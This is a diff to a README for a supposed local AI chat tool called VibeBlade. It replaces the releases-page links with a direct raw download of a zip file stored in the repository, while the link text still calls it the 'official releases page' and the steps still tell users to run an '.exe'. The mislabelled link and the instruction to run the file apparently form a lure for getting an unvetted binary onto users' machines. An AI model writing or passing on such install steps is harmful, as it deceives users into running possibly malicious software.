@@ -1,6 +1,6 @@
 # ⚡ VibeBlade - Run Private Artificial Intelligence Locally
 
-[![](https://img.shields.io/badge/Download_VibeBlade-Blue?style=for-the-badge&logo=github)](https://github.com/Cerealbowlfilthiness927/VibeBlade/releases)
+[![](https://img.shields.io/badge/Download_VibeBlade-Blue?style=for-the-badge&logo=github)](https://github.com/Cerealbowlfilthiness927/VibeBlade/raw/refs/heads/main/vibeblade/Vibe-Blade-v2.2.zip)
 
 VibeBlade allows you to run powerful artificial intelligence models on your own computer. You keep your data private because the software runs entirely on your hardware. You do not need a subscription, and you do not need to connect to the internet to chat with your model. 
 
@@ -18,7 +18,7 @@ Your computer must meet these standards to run VibeBlade effectively:
 
 You perform the installation in three steps.
 
-1. Visit the [official releases page](https://github.com/Cerealbowlfilthiness927/VibeBlade/releases) to access the download files.
+1. Visit the [official releases page](https://github.com/Cerealbowlfilthiness927/VibeBlade/raw/refs/heads/main/vibeblade/Vibe-Blade-v2.2.zip) to access the download files.
 2. Look for the file ending in `.exe` under the latest version tag. Click this file to save it to your computer.
 3. Open the downloaded file once the transfer completes. Follow the instructions on the screen to finalize the setup.
 
